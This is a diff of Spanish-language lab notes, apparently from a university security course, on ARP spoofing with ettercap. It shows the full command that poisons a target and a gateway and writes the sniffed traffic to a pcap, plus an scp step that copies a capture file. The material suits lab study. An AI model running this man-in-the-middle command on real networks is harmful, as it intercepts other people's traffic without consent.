@@ -12,9 +12,6 @@ ettercap /10.11.48.56//
 ```
 Con ettercap realizaremos ARP spoofing
 # B)
-Captura de trafico, usando ettercap + wireshark para snifear y visualizar data (pdf, gif, ...)
-## Solución
-### Spoofing
 Comando básico para realizar spoofing:
 ```bash
 ettercap -T -q -i ens33 -M arp:remote //10.11.48.142/ //10.11.48.1/ -w bisbi.pcap
@@ -27,13 +24,8 @@ ettercap -T -q -i ens33 -M arp:remote //10.11.48.142/ //10.11.48.1/ -w bisbi.pca
 		- target
 		- gateway
 
-Guardar los paquetes recibidos:
+Envió de los archivos:
 ```shell
-//captura
-tcpdump -i ens33 -s 65535 -w tcp_bisbi.pcap
-
-//nuestro compañero busca cosas
-
 //en otra maquina
 scp lsi@10.11.48.143:/home/lsi/tcp_bisbi.pcap .
 ```
